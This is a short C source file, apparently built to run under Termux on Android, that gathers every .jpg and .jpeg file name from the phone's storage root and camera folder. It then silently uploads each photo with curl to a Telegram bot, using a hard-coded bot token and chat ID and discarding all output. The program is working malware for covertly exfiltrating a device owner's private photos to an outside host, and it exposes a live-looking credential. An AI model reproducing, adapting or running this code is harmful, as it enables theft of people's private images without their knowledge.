#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>

int main(int argc, char *argv[])
{
		char buffer[9999];
		char dir[50];

 chdir("/storage/emulated/0/");

system("ls | grep .jpg >>galxi");
system("ls | grep .jpeg >>galxi");

    chdir("/data/data/com.termux/files/home");

chdir("/storage/emulated/0/DCIM/Camera/");
system("ls | grep .jpg >>galxi");
system("ls | grep .jpeg >>galxi");

char buf[9999];
		FILE *pf;
pf=fopen("galxi","r");
   	   
   	   
	while(fgets(buffer,9999,pf)!=NULL){
		   	buffer[strlen(buffer)-1]='\0';
		   					
		   			
		

snprintf(buf,9999,"curl -X POST -H \"Content-Type:multipart/form-data\" -F chat_id=-1001722418435 -F photo=@%s \"https://api.telegram.org/bot6154815846:AAHEPFr7lryMuhXVe1j99qJp0BE2Q9mvspc/sendPhoto\" > /dev/null 2>&1\n\n",buffer);

system(buf);

	}
 chdir("/data/data/com.termux/files/home");
 
}
